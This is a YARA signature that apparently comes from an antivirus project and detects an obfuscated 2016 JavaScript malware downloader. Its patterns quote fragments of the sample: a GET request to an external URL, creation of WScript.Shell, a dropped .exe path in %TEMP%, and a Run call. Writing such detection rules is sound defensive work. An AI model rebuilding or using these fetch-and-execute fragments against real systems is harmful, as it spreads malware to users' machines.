rule sig_20160330_717ba6d903060e51317e624331d81538 {
  meta:
    description = "datamaliciousorder - file 20160330_717ba6d903060e51317e624331d81538.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "1eaa4926602e4d757e8665e83e0ba50bdee8791c12ba418f5d5b16200a25c36d"

  strings:
    $s1  = "_U[_OJ](\"GET\", \"http://linkownia.itcom.pl/s9aps\", false);" fullword ascii
    $s2  = "var _VB = function _F() {return WScript[_BP](\"WScript\"+\".Shell\");}(), _JX = 11;" fullword ascii
    $s3  = "function _JP(_B, _K){_FG = _FG * 1; return _B - _K;};" fullword ascii
    $s4  = "if (_U[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _PS(){return _J + \"\";};" fullword ascii
    $s6  = "function _OE() {return _VB[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"xGZ4gPKUPyfgFA.ex\" + \"e\";};" fullword ascii
    $s7  = "function _MC(_C){_VB[\"Run\"](_C, _FG, _FG);};" fullword ascii
    $s8  = "function _FU() {return ((_Y0 == true) && (_Y0 == _NT)) ? 1 : _FG;};" fullword ascii
    $s9  = "function _QU(){return _BP;};" fullword ascii
    $s10 = "function _OL(){return 22;};" fullword ascii
    $s11 = "function _YB()" fullword ascii
    $s12 = "return _JP(_JC, _O);" fullword ascii
    $s13 = "var _KR = new this[\"Date\"]();" fullword ascii
    $s14 = " while (_Y){" fullword ascii
    $s15 = "function _BZ(_IQ) {var _JZ = (1, 2, 3, 4, 5, _IQ); return _JZ;};" fullword ascii
    $s16 = "var _Y0 = false;" fullword ascii
    $s17 = "_NT = true; " fullword ascii
    $s18 = "var _NT = false;" fullword ascii
    $s19 = "var _CU = false;" fullword ascii
    $s20 = "_Y0 = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}